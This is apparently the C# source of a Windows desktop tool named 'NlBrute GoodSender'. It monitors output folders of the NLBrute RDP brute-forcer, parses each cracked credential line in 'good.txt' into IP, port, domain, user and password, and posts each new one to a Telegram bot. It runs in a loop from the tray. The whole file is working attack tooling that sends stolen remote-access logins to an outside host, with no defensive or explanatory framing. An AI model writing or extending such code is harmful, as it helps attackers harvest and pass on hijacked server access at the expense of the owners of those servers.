using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Reflection;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace NlBrute_GoodSender
{
    public partial class Form1 : Form
    {

        HttpClient client = new HttpClient();
        List<string> NlBruteFolders = new List<string>();
        List<string> Sended = new List<string>();
        string TOken_BOT = "";
        long CHATID_USER = 0;
        public Form1()
        {
            InitializeComponent();

        }

        #region Main_Working
        async Task RUN()
        {
            label3.ForeColor = Color.Green;
            while (true)
            {
                foreach (string URLNlBrute in NlBruteFolders)
                {
                    if (File.Exists(URLNlBrute + @"\good.txt"))
                    {

                        string[] FileGood = File.ReadAllLines(URLNlBrute + @"\good.txt", System.Text.Encoding.Unicode);
                        foreach (var nS in FileGood)
                        {
                            if (!Sended.Exists(x => x == nS) && nS != "")
                            {
                                Sended.Add(nS);
                                notifyIcon1.ShowBalloonTip(2000, "Good_Found", nS, ToolTipIcon.Info);
                                var Temp = Regex.Match(nS, @"^(.*?):(.*?)@(.*?)\\(.*?);(.*?)$").Groups;
                                string MessageTelegram = $"🌐 IP Address: `{Temp[1].Value}`\n💠 PORT: `{Temp[2].Value}`\n🌐 FullAddress:`{Temp[1].Value}:{Temp[2].Value}` \n⚔️ Domain: `{Temp[3].Value}`\n👤 USER: `{Temp[4].Value}`\n♨️ PASSWORD: `{Temp[5].Value}`";
                                await SendTelegramMessage(MessageTelegram);
                            }
                        }
                    }
                }

                await Task.Delay(2000);
            }
        }
        #endregion
        #region Telegram
        async Task SendTelegramMessage(string messageText)
        {
            var sendMessageUrl = $"https://api.telegram.org/bot{TOken_BOT}/sendMessage";
            var content = new FormUrlEncodedContent(new[]
            {
            new KeyValuePair<string, string>("chat_id", CHATID_USER.ToString()),
            new KeyValuePair<string, string>("text",messageText),
            new KeyValuePair<string, string>("parse_mode","MarkdownV2")
            });

            await client.PostAsync(sendMessageUrl, content);
        }

        async Task<bool> BOTName()
        {
            try
            {

                string apiUrl = $"https://api.telegram.org/bot{TOken_BOT}/getMe";
                string INFO = await client.GetStringAsync(apiUrl);
                label3.Text = $"Connected({Regex.Match(INFO, "\"username\":\"(.*?)\"").Groups[1].Value})!";
                var z = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem").Get();
                string WindowsVerion = "NotFound";
                foreach (var n in z)
                {
                    WindowsVerion = n["Caption"].ToString();
                }
                await SendTelegramMessage($"BOT Connected\nComputer: `{SystemInformation.ComputerName}`\nUsername: `{SystemInformation.UserName}`\nWindows Verion: `{WindowsVerion}`\nTime Connected: `{DateTime.Now.ToString("HH:mm:ss")}`");
                return true;
            }
            catch (Exception Ex) { MessageBox.Show($"Error: {Ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error); return false; }
        }
        #endregion
        #region UI_Items_Events

        void GetSetImage()
        {
            this.Icon = Good_Sender.Properties.Resources.AppLogo;
            notifyIcon1.Icon = Good_Sender.Properties.Resources.AppLogo;
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            GetSetImage();
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11;
            try
            {
                if (File.Exists("Data.txt"))
                {
                    string[] Data = File.ReadAllLines("Data.txt");
                    textBox1.Text = Data[0];
                    numericUpDown1.Value = Convert.ToInt64(Data[1]);

                }
            }
            catch { }
        }
        private async void button1_Click(object sender, EventArgs e)
        {
            File.WriteAllLines("Data.txt", new string[] { textBox1.Text, numericUpDown1.Value.ToString() });
            CHATID_USER = Convert.ToInt64(numericUpDown1.Value);
            TOken_BOT = textBox1.Text;
            label3.ForeColor = Color.Orange;
            label3.Text = "Please Wait....";
            if (await BOTName())
            {
                button1.Visible = false;
                
                await RUN();
            }
            else
            {
                label3.ForeColor = Color.Red;
                label3.Text = "Error";
            }
        }
        private void Form1_Resize(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Minimized)
            {
                this.Hide();
                notifyIcon1.ShowBalloonTip(2000, "INFO", "Applicaion Minimized", ToolTipIcon.Info);
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if (folderBrowserDialog1.ShowDialog() == DialogResult.OK)
            {
                if (!NlBruteFolders.Exists(x => x == folderBrowserDialog1.SelectedPath)) { NlBruteFolders.Add(folderBrowserDialog1.SelectedPath); label5.Text = NlBruteFolders.Count.ToString(); }
                ;
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            NlBruteFolders.Clear();
            label5.Text = "0";
        }

        private void notifyIcon1_MouseClick(object sender, MouseEventArgs e)
        {
            if (contextMenuStrip1.Visible == true)
            {
                contextMenuStrip1.Visible = false;
            }
            else
            {
                contextMenuStrip1.Show(MousePosition);
            }

        }

        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void hideToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.Hide();
        }

        private void showToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.Show();
            this.WindowState = FormWindowState.Normal;
        }
        #endregion
    }
}
